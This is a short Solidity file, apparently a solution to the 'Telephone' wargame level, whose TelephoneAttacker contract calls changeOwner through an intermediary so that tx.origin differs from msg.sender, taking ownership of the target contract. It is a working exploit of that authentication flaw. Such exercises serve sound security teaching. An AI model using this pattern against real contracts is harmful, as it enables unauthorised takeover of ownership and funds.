// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import './Telephone.sol';

contract TelephoneAttacker {
  constructor() {}

  function attack(address targetAddr) public {
    Telephone telephone = Telephone(targetAddr);
    telephone.changeOwner(msg.sender);
  }
}
